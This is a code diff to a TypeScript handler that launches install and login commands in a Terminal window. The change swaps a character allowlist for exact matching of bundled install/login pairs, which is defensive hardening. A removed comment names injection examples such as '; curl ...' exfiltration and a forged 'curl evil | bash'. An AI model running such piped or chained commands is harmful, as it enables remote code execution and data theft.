@@ -21,7 +21,7 @@ import { existsSync, mkdirSync, statSync, writeFileSync } from "node:fs";
 import os from "node:os";
 import path from "node:path";
 import type { CommandHandler } from "../router";
-import { isKnownInstallCommand } from "../../../src/engine/agents/install-commands";
+import { isKnownInstallCommand, trustedInstallLogin } from "../../../src/engine/agents/install-commands";
 import { normalizeExternalHttpUrl } from "@zeros/protocol/external-url";
 import { withoutLocalDevelopment } from "../../../src/engine/env/local-development";
 
@@ -96,44 +96,12 @@ export const openAgentConfig: CommandHandler = (args) => {
   shell.showItemInFolder(file);
 };
 
-/** Run a Zeros-registry install command in a real Terminal window.
- *
- *  The caller passes the raw shell line (e.g. `npm install -g <pkg>`
- *  or `curl -fsSL https://... | sh`). We don't parse or rewrite it —
- *  but we DO enforce a strict character allowlist so a
- *  compromised registry can't exfil data via `; curl ...`.
- *
- *  Optional `loginCommand` chains a second command via `&&` so the
- *  Terminal session runs install-then-login in one go. Both inputs
- *  go through the same allowlist independently; the `&&` separator
- *  is added server-side after validation so it never has to appear
- *  in the renderer-side input.
- *
- *  The LOGIN command (a `<binary> login`-style line, never a pipe) is still
- *  character-validated. The INSTALL command is exact-matched against the
- *  bundled set — the character allowlist alone can't help, because a real
- *  installer is itself `curl … | bash`, so an XSS could forge `curl evil | bash`
- *  and pass the character check.
- *
- *  Login-line allowed chars: alphanumeric, space, and: - _ . / : @ = + ,
- *  (no `|` — login lines never pipe).
- */
-const LOGIN_CMD_ALLOWED = /^[A-Za-z0-9 \-_./:@=+,]+$/;
+/** Run only a bundled installer and its paired, bundled login command.
+ * Renderer input selects a pair; it never supplies executable login text. */
 /** Escape a string for embedding inside an AppleScript double-quoted
  *  literal. Shared with open-apps.ts for CLI-based Terminal launches. */
 export const APPLESCRIPT_ESC = (s: string) =>
   s.replace(/\\/g, "\\\\").replace(/"/g, '\\"');
-
-function validateShellLine(value: unknown, label: string): string {
-  const cmd = typeof value === "string" ? value : "";
-  if (!cmd || cmd.length > 512) {
-    throw new Error(`invalid ${label}`);
-  }
-  if (!LOGIN_CMD_ALLOWED.test(cmd)) {
-    throw new Error(`${label} contains disallowed characters`);
-  }
-  return cmd;
-}
 
 export const openInstallTerminal: CommandHandler = (args) => {
   // Only run a command that exactly matches a bundled install one-liner.
@@ -149,7 +117,7 @@ export const openInstallTerminal: CommandHandler = (args) => {
   const loginCommand =
     args.loginCommand === undefined
       ? null
-      : validateShellLine(args.loginCommand, "login command");
+      : trustedInstallLogin(command, args.loginCommand);
 
   const joined = loginCommand ? `${command} && ${loginCommand}` : command;
   const escaped = APPLESCRIPT_ESC(joined);
